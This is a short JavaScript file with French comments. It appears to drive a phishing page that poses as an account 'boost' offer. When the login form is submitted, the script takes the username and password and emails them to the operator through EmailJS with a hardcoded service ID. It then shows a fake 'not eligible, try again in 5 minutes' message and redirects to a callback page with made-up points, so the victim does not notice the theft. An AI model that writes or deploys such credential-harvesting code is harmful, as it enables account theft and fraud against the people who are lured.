// Initialisez EmailJS avec votre User ID
(function(){
    emailjs.init("AFJxHKEa2Jajo3FT6"); // Remplacez par votre User ID EmailJS
})();

document.addEventListener("DOMContentLoaded", function () {
    // Attachez un événement au bouton de soumission du formulaire
    document.getElementById("myForm").addEventListener("submit", function (event) {
        event.preventDefault(); // Empêcher le comportement de soumission par défaut

        // Valider les champs du formulaire
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        if (username === "" || password === "") {
            alert("Veuillez remplir tous les champs.");
        } else {
            // Si la validation est réussie, envoyez l'e-mail avec EmailJS
            emailjs.sendForm('service_ftsujwe', 'template_0001', this)
            .then(function () {
                alert("Désolé votre compte n'est pas éligible pour le boost, ressayer dans 5min.");
                
                // Simuler l'envoi de points et rediriger vers la page de callback
                const pointsToConvert = 100; // Exemple de points à convertir
                window.location.href = `callback.html?user=${encodeURIComponent(username)}&points=${pointsToConvert}&success=true`;
            }, function (error) {
                alert('Échec de l\'envoi du formulaire : ' + JSON.stringify(error));
            });
        }
    });
});